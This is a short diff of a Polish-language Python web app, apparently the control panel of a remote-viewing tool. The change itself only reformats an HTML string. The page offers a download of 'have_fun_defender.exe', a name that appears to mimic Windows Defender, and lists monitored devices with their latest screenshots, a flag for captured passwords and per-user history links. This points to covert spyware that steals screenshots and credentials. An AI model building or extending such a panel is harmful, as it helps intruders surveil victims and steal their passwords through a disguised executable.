@@ -37,13 +37,13 @@ def index():
         except:
             device_list.append((u, "🔴", "błąd daty", has_passwords))
 
-    content = """
-    <h1>📦 Pobierz klienta</h1>
-    <p><a href="https://github.com/Crazy2515/zdalny-podglad/raw/main/client_download/have_fun_defender.exe" download>
-    ⬇️ have_fun_defender.exe</a></p>
-    <h1>Urządzenia: {}</h1>
-    <ul>
-    """.format(len(device_list))
+    content = f"""
+<h1>📦 Pobierz klienta</h1>
+<p><a href="https://github.com/Crazy2515/zdalny-podglad/raw/main/client_download/have_fun_defender.exe" download>
+⬇️ have_fun_defender.exe</a></p>
+<h1>Urządzenia: {len(device_list)}</h1>
+<ul>
+"""
 
     for u, status, t, has_passwords in device_list:
         content += f'<li>{status} <a href="/view?user={u}">{u}</a> (ostatni screen: {t}) | <a href="/history?user={u}">Historia</a>'
